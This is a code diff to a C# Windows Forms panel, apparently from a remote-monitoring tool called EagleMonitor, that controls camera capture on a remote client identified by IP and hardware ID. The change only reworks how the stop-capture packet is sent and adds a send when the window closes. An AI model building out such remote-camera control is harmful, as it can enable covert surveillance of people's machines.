@@ -5,7 +5,6 @@ using PacketLib.Packet;
 using System;
 using System.IO;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 /* 
@@ -36,7 +35,7 @@ namespace EagleMonitor.Forms
             ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteCameraPacket);
         }
 
-        private async void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
+        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
             if (captureGuna2ToggleSwitch.Checked)
             {
@@ -59,9 +58,12 @@ namespace EagleMonitor.Forms
                 {
                     this.loadingCircle1.Visible = false;
                     this.loadingCircle1.Active = false;
-                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF);
-                    await Task.Run(() => this.clientHandler.SendPacket(remoteCameraCapturePacket));
-                    await Task.Run(() => this.clientHandler.Dispose());        
+                    RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
+                    {
+                        baseIp = this.baseIp,
+                        HWID = ClientHandler.ClientHandlersList[baseIp].HWID
+                    };
+                    this.clientHandler.SendPacket(remoteCameraCapturePacket);
                 }
             }
         }
@@ -117,6 +119,15 @@ namespace EagleMonitor.Forms
 
         private void closeButton_Click(object sender, EventArgs e)
         {
+            if (captureGuna2ToggleSwitch.Checked) 
+            {
+                RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(PacketType.RC_CAPTURE_OFF)
+                {
+                    baseIp = this.baseIp,
+                    HWID = ClientHandler.ClientHandlersList[baseIp].HWID
+                };
+                this.clientHandler.SendPacket(remoteCameraCapturePacket);
+            }
             this.Close();
         }
 
